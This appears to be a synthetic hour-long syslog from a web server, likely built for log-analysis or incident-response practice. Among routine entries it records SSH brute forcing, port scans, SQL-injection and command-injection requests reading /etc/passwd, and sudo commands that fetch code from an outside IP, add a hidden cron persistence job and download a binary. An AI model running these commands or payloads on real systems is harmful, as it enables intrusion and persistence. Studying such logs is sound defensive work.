@@ -1,0 +1,169 @@
+Aug 12 08:00:01 web01 systemd[1]: Started Daily Cleanup of Temporary Directories.
+Aug 12 08:00:01 web01 CRON[18421]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:00:03 web01 systemd[1]: Starting Daily apt download activities...
+Aug 12 08:00:04 web01 systemd[1]: Finished Daily apt download activities.
+Aug 12 08:01:12 web01 sshd[18429]: Accepted publickey for analyst from 192.0.2.44 port 52134 ssh2: ED25519 SHA256:Qx7h2n4xExample
+Aug 12 08:01:12 web01 sshd[18429]: pam_unix(sshd:session): session opened for user analyst(uid=1001) by (uid=0)
+Aug 12 08:02:19 web01 systemd[1]: Started Session 914 of User analyst.
+Aug 12 08:03:01 web01 CRON[18457]: (analyst) CMD (/home/analyst/scripts/healthcheck.sh)
+Aug 12 08:04:33 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=198.51.100.24 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=43821 DPT=23 WINDOW=64240 SYN
+Aug 12 08:05:10 web01 systemd[1]: Starting Network Manager Script Dispatcher Service...
+Aug 12 08:05:10 web01 systemd[1]: Started Network Manager Script Dispatcher Service.
+Aug 12 08:06:44 web01 sshd[18501]: Failed password for invalid user admin from 203.0.113.71 port 41982 ssh2
+Aug 12 08:06:46 web01 sshd[18503]: Failed password for invalid user admin from 203.0.113.71 port 41984 ssh2
+Aug 12 08:06:48 web01 sshd[18505]: Failed password for invalid user admin from 203.0.113.71 port 41986 ssh2
+Aug 12 08:06:51 web01 sshd[18507]: Failed password for invalid user admin from 203.0.113.71 port 41988 ssh2
+Aug 12 08:06:53 web01 sshd[18509]: Failed password for invalid user admin from 203.0.113.71 port 41990 ssh2
+Aug 12 08:06:56 web01 sshd[18511]: Failed password for invalid user administrator from 203.0.113.71 port 41992 ssh2
+Aug 12 08:06:58 web01 sshd[18513]: Failed password for invalid user administrator from 203.0.113.71 port 41994 ssh2
+Aug 12 08:07:01 web01 sshd[18515]: Failed password for invalid user root from 203.0.113.71 port 41996 ssh2
+Aug 12 08:07:04 web01 sshd[18517]: Failed password for invalid user root from 203.0.113.71 port 41998 ssh2
+Aug 12 08:07:07 web01 sshd[18519]: Failed password for invalid user test from 203.0.113.71 port 42000 ssh2
+Aug 12 08:07:09 web01 sshd[18521]: Failed password for invalid user test from 203.0.113.71 port 42002 ssh2
+Aug 12 08:07:11 web01 sshd[18523]: Failed password for invalid user guest from 203.0.113.71 port 42004 ssh2
+Aug 12 08:07:14 web01 sshd[18525]: Failed password for invalid user guest from 203.0.113.71 port 42006 ssh2
+Aug 12 08:07:18 web01 sshd[18527]: Failed password for invalid user postgres from 203.0.113.71 port 42008 ssh2
+Aug 12 08:07:22 web01 sshd[18529]: Failed password for invalid user mysql from 203.0.113.71 port 42010 ssh2
+Aug 12 08:07:26 web01 sshd[18531]: Failed password for invalid user deploy from 203.0.113.71 port 42012 ssh2
+Aug 12 08:08:02 web01 sshd[18542]: Connection closed by invalid user admin 203.0.113.71 port 42019 [preauth]
+Aug 12 08:08:19 web01 systemd[1]: Started Run system activity accounting tool.
+Aug 12 08:08:20 web01 sysstat[18549]: SA1: system activity data collection succeeded
+Aug 12 08:09:47 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:09:47 -0500] "GET /index.html HTTP/1.1" 200 4821 "-" "Mozilla/5.0"
+Aug 12 08:10:03 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:10:03 -0500] "GET /login HTTP/1.1" 200 1932 "-" "Mozilla/5.0"
+Aug 12 08:10:41 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:10:41 -0500] "GET /robots.txt HTTP/1.1" 404 153 "-" "Mozilla/5.0"
+Aug 12 08:11:17 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:11:17 -0500] "GET /wp-login.php HTTP/1.1" 404 153 "-" "Mozilla/5.0"
+Aug 12 08:11:20 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:11:20 -0500] "GET /.env HTTP/1.1" 404 153 "-" "curl/8.4.0"
+Aug 12 08:11:22 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:11:22 -0500] "GET /config.php HTTP/1.1" 404 153 "-" "curl/8.4.0"
+Aug 12 08:12:05 web01 CRON[18602]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:12:44 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=198.51.100.89 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=51422 DPT=445 WINDOW=1024 SYN
+Aug 12 08:13:09 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:13:09 -0500] "GET /cgi-bin/status?cmd=cat%20/etc/passwd HTTP/1.1" 400 166 "-" "curl/8.4.0"
+Aug 12 08:13:15 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:13:15 -0500] "GET /api/v1/users?id=1 HTTP/1.1" 200 824 "-" "Mozilla/5.0"
+Aug 12 08:13:18 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:13:18 -0500] "GET /api/v1/users?id=1%20OR%201=1 HTTP/1.1" 400 166 "-" "sqlmap/1.8"
+Aug 12 08:13:21 web01 nginx[16322]: 198.51.100.89 - - [12/Aug/2026:08:13:21 -0500] "GET /api/v1/users?id=1%27%20OR%20%271%27=%271 HTTP/1.1" 400 166 "-" "sqlmap/1.8"
+Aug 12 08:14:02 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35501 DPT=22 WINDOW=1024 SYN
+Aug 12 08:14:04 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35502 DPT=80 WINDOW=1024 SYN
+Aug 12 08:14:05 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35503 DPT=443 WINDOW=1024 SYN
+Aug 12 08:14:06 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35504 DPT=3306 WINDOW=1024 SYN
+Aug 12 08:14:07 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35505 DPT=5432 WINDOW=1024 SYN
+Aug 12 08:14:08 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35506 DPT=8080 WINDOW=1024 SYN
+Aug 12 08:14:09 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=35507 DPT=8443 WINDOW=1024 SYN
+Aug 12 08:15:11 web01 systemd[1]: Started Daily apt upgrade and clean activities.
+Aug 12 08:15:12 web01 apt.systemd.daily[18644]: Checking for updates.
+Aug 12 08:15:18 web01 apt.systemd.daily[18644]: No packages found that can be upgraded.
+Aug 12 08:16:43 web01 sudo[18673]: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/systemctl status nginx
+Aug 12 08:16:43 web01 sudo[18673]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:16:44 web01 sudo[18673]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:17:20 web01 sshd[18702]: Accepted publickey for analyst from 192.0.2.44 port 52381 ssh2: ED25519 SHA256:Qx7h2n4xExample
+Aug 12 08:18:01 web01 CRON[18721]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:18:44 web01 sudo[18738]: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/curl -fsSL http://198.51.100.200/update
+Aug 12 08:18:44 web01 sudo[18738]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:18:45 web01 sudo[18738]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:18:46 web01 systemd[1]: Started Session 918 of User root.
+Aug 12 08:18:47 web01 kernel: audit: type=1107 audit(1786537127.431:241): pid=18744 uid=0 auid=1001 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=192.0.2.44 terminal=/dev/pts/0 res=success'
+Aug 12 08:19:02 web01 systemd[1]: Started User Manager for UID 0.
+Aug 12 08:19:16 web01 kernel: audit: type=1100 audit(1786537156.921:242): pid=18752 uid=0 auid=1001 msg='op=PAM:authentication acct="root" exe="/usr/bin/sudo" hostname=? addr=192.0.2.44 terminal=/dev/pts/0 res=success'
+Aug 12 08:20:01 web01 CRON[18782]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:20:33 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:20:33 -0500] "GET /dashboard HTTP/1.1" 200 12043 "https://portal.example.internal/" "Mozilla/5.0"
+Aug 12 08:21:47 web01 systemd[1]: Started Session 919 of User analyst.
+Aug 12 08:22:04 web01 sudo[18819]: analyst : TTY=pts/1 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash -c echo '* * * * * /tmp/.cache/.update >/dev/null 2>&1' >> /etc/crontab
+Aug 12 08:22:04 web01 sudo[18819]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:22:05 web01 sudo[18819]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:22:07 web01 cron[18831]: (CRON) INFO (Running @reboot jobs)
+Aug 12 08:22:08 web01 cron[18831]: (root) ERROR (bad minute)
+Aug 12 08:23:19 web01 systemd[1]: Reloading configuration.
+Aug 12 08:23:19 web01 systemd[1]: Reloaded configuration.
+Aug 12 08:24:03 web01 CRON[18851]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:24:41 web01 kernel: audit: type=1105 audit(1786537481.337:243): pid=18861 uid=0 auid=1001 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=192.0.2.44 terminal=/dev/pts/1 res=success'
+Aug 12 08:25:12 web01 systemd[1]: Starting Rotate log files...
+Aug 12 08:25:12 web01 systemd[1]: Finished Rotate log files.
+Aug 12 08:26:33 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:26:33 -0500] "POST /api/v1/login HTTP/1.1" 401 421 "-" "Mozilla/5.0"
+Aug 12 08:26:35 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:26:35 -0500] "POST /api/v1/login HTTP/1.1" 401 421 "-" "Mozilla/5.0"
+Aug 12 08:26:39 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:26:39 -0500] "POST /api/v1/login HTTP/1.1" 200 912 "-" "Mozilla/5.0"
+Aug 12 08:27:04 web01 systemd[1]: Starting Daily man-db regeneration...
+Aug 12 08:27:05 web01 systemd[1]: Finished Daily man-db regeneration.
+Aug 12 08:28:11 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=41121 DPT=139 WINDOW=1024 SYN
+Aug 12 08:28:12 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=41122 DPT=3389 WINDOW=1024 SYN
+Aug 12 08:28:13 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=41123 DPT=5900 WINDOW=1024 SYN
+Aug 12 08:28:14 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.55 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=41124 DPT=6379 WINDOW=1024 SYN
+Aug 12 08:29:02 web01 sshd[18952]: Failed password for analyst from 198.51.100.200 port 51144 ssh2
+Aug 12 08:29:05 web01 sshd[18954]: Failed password for analyst from 198.51.100.200 port 51146 ssh2
+Aug 12 08:29:08 web01 sshd[18956]: Failed password for analyst from 198.51.100.200 port 51148 ssh2
+Aug 12 08:29:11 web01 sshd[18958]: Failed password for analyst from 198.51.100.200 port 51150 ssh2
+Aug 12 08:29:15 web01 sshd[18960]: Failed password for analyst from 198.51.100.200 port 51152 ssh2
+Aug 12 08:29:19 web01 sshd[18962]: Failed password for analyst from 198.51.100.200 port 51154 ssh2
+Aug 12 08:29:22 web01 sshd[18964]: Failed password for analyst from 198.51.100.200 port 51156 ssh2
+Aug 12 08:29:25 web01 sshd[18966]: Failed password for analyst from 198.51.100.200 port 51158 ssh2
+Aug 12 08:30:01 web01 CRON[18981]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:30:19 web01 sshd[18991]: Failed password for analyst from 198.51.100.200 port 51160 ssh2
+Aug 12 08:30:24 web01 sshd[18993]: Failed password for analyst from 198.51.100.200 port 51162 ssh2
+Aug 12 08:30:28 web01 sshd[18995]: Failed password for analyst from 198.51.100.200 port 51164 ssh2
+Aug 12 08:30:33 web01 sshd[18997]: Failed password for analyst from 198.51.100.200 port 51166 ssh2
+Aug 12 08:30:37 web01 sshd[18999]: Failed password for analyst from 198.51.100.200 port 51168 ssh2
+Aug 12 08:31:04 web01 sshd[19001]: error: maximum authentication attempts exceeded for analyst from 198.51.100.200 port 51170 ssh2 [preauth]
+Aug 12 08:31:05 web01 sshd[19001]: Disconnecting authenticating user analyst 198.51.100.200 port 51170: Too many authentication failures [preauth]
+Aug 12 08:31:21 web01 systemd[1]: Started Daily apt download activities.
+Aug 12 08:31:22 web01 systemd[1]: Finished Daily apt download activities.
+Aug 12 08:32:14 web01 nginx[16322]: 198.51.100.200 - - [12/Aug/2026:08:32:14 -0500] "GET / HTTP/1.1" 200 4821 "-" "Mozilla/5.0"
+Aug 12 08:32:19 web01 nginx[16322]: 198.51.100.200 - - [12/Aug/2026:08:32:19 -0500] "GET /admin HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+Aug 12 08:32:22 web01 nginx[16322]: 198.51.100.200 - - [12/Aug/2026:08:32:22 -0500] "GET /server-status HTTP/1.1" 403 512 "-" "Mozilla/5.0"
+Aug 12 08:33:01 web01 CRON[19052]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:33:45 web01 sudo[19063]: analyst : TTY=pts/1 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/logs.tgz /var/log/auth.log /var/log/syslog
+Aug 12 08:33:45 web01 sudo[19063]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:33:47 web01 sudo[19063]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:34:03 web01 systemd[1]: Started User Manager for UID 1001.
+Aug 12 08:34:28 web01 sshd[19101]: Accepted publickey for analyst from 192.0.2.44 port 52811 ssh2: ED25519 SHA256:Qx7h2n4xExample
+Aug 12 08:34:28 web01 sshd[19101]: pam_unix(sshd:session): session opened for user analyst(uid=1001) by (uid=0)
+Aug 12 08:35:11 web01 sudo[19117]: analyst : TTY=pts/2 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/curl -fsSL https://updates.example.invalid/agent.bin -o /tmp/.cache/agent.bin
+Aug 12 08:35:11 web01 sudo[19117]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:35:12 web01 sudo[19117]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:35:13 web01 kernel: audit: type=1105 audit(1786538113.121:244): pid=19117 uid=0 auid=1001 msg='op=PAM:session_close acct="root" exe="/usr/bin/sudo" hostname=? addr=192.0.2.44 terminal=/dev/pts/2 res=success'
+Aug 12 08:35:24 web01 systemd[1]: Started Cleanup of temporary files.
+Aug 12 08:35:25 web01 systemd[1]: Finished Cleanup of temporary files.
+Aug 12 08:36:01 web01 CRON[19146]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:36:42 web01 kernel: audit: type=1107 audit(1786538202.871:245): pid=19161 uid=0 auid=1001 msg='op=PAM:session_open grantors=pam_unix acct="root" exe="/usr/bin/sudo" hostname=? addr=192.0.2.44 terminal=/dev/pts/2 res=success'
+Aug 12 08:37:05 web01 systemd[1]: Starting Daily database backup...
+Aug 12 08:37:08 web01 backup[19182]: INFO: PostgreSQL backup completed successfully.
+Aug 12 08:37:09 web01 systemd[1]: Finished Daily database backup.
+Aug 12 08:38:14 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:38:14 -0500] "GET /reports HTTP/1.1" 200 8431 "https://portal.example.internal/" "Mozilla/5.0"
+Aug 12 08:39:01 web01 CRON[19213]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:40:12 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=198.51.100.24 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=48211 DPT=23 WINDOW=64240 SYN
+Aug 12 08:41:37 web01 systemd[1]: Starting Daily man-db regeneration...
+Aug 12 08:41:38 web01 systemd[1]: Finished Daily man-db regeneration.
+Aug 12 08:42:02 web01 nginx[16322]: 192.0.2.44 - - [12/Aug/2026:08:42:02 -0500] "GET /api/v1/health HTTP/1.1" 200 37 "-" "Mozilla/5.0"
+Aug 12 08:43:01 web01 CRON[19281]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:44:19 web01 sshd[19302]: Accepted publickey for analyst from 192.0.2.44 port 53419 ssh2: ED25519 SHA256:Qx7h2n4xExample
+Aug 12 08:45:02 web01 sudo[19318]: analyst : TTY=pts/3 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Aug 12 08:45:02 web01 sudo[19318]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:45:04 web01 systemd[1]: Stopping A high performance web server and a reverse proxy server...
+Aug 12 08:45:04 web01 systemd[1]: nginx.service: Deactivated successfully.
+Aug 12 08:45:04 web01 systemd[1]: Stopped A high performance web server and a reverse proxy server.
+Aug 12 08:45:04 web01 systemd[1]: Starting A high performance web server and a reverse proxy server...
+Aug 12 08:45:04 web01 systemd[1]: Started A high performance web server and a reverse proxy server.
+Aug 12 08:45:05 web01 sudo[19318]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:46:01 web01 CRON[19349]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:47:33 web01 nginx[19352]: 198.51.100.200 - - [12/Aug/2026:08:47:33 -0500] "POST /api/v1/upload HTTP/1.1" 413 572 "-" "python-requests/2.31.0"
+Aug 12 08:47:36 web01 nginx[19352]: 198.51.100.200 - - [12/Aug/2026:08:47:36 -0500] "POST /api/v1/upload HTTP/1.1" 413 572 "-" "python-requests/2.31.0"
+Aug 12 08:48:01 web01 CRON[19381]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:48:21 web01 kernel: audit: type=1100 audit(1786538901.551:246): pid=19392 uid=0 auid=1001 msg='op=PAM:authentication acct="root" exe="/usr/bin/sudo" hostname=? addr=192.0.2.44 terminal=/dev/pts/3 res=success'
+Aug 12 08:49:04 web01 sshd[19410]: pam_unix(sshd:session): session closed for user analyst
+Aug 12 08:49:04 web01 systemd[1]: Removed slice User Slice of UID 1001.
+Aug 12 08:50:01 web01 CRON[19427]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:50:37 web01 systemd[1]: Starting Daily apt download activities...
+Aug 12 08:50:38 web01 systemd[1]: Finished Daily apt download activities.
+Aug 12 08:51:16 web01 kernel: [UFW BLOCK] IN=eth0 OUT= MAC=52:54:00:12:34:56 SRC=203.0.113.71 DST=10.10.20.15 LEN=60 PROTO=TCP SPT=43120 DPT=22 WINDOW=64240 SYN
+Aug 12 08:52:03 web01 nginx[19352]: 192.0.2.44 - - [12/Aug/2026:08:52:03 -0500] "GET /index.html HTTP/1.1" 200 4821 "-" "Mozilla/5.0"
+Aug 12 08:53:01 web01 CRON[19483]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:54:22 web01 systemd[1]: Started Session 925 of User analyst.
+Aug 12 08:55:11 web01 sshd[19514]: Failed password for invalid user backup from 203.0.113.71 port 43014 ssh2
+Aug 12 08:55:13 web01 sshd[19516]: Failed password for invalid user backup from 203.0.113.71 port 43016 ssh2
+Aug 12 08:55:15 web01 sshd[19518]: Failed password for invalid user backup from 203.0.113.71 port 43018 ssh2
+Aug 12 08:55:17 web01 sshd[19520]: Failed password for invalid user backup from 203.0.113.71 port 43020 ssh2
+Aug 12 08:56:01 web01 CRON[19534]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 08:57:42 web01 sudo[19553]: analyst : TTY=pts/4 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/journalctl --since "1 hour ago"
+Aug 12 08:57:42 web01 sudo[19553]: pam_unix(sudo:session): session opened for user root(uid=0) by analyst(uid=1001)
+Aug 12 08:57:44 web01 sudo[19553]: pam_unix(sudo:session): session closed for user root
+Aug 12 08:58:13 web01 systemd[1]: Started Daily apt upgrade and clean activities.
+Aug 12 08:58:14 web01 systemd[1]: Finished Daily apt upgrade and clean activities.
+Aug 12 08:59:01 web01 CRON[19602]: (root) CMD (/usr/lib/cron/cleanup-temp)
+Aug 12 09:00:00 web01 systemd[1]: Starting Daily Cleanup of Temporary Directories...
+Aug 12 09:00:01 web01 systemd[1]: Finished Daily Cleanup of Temporary Directories.
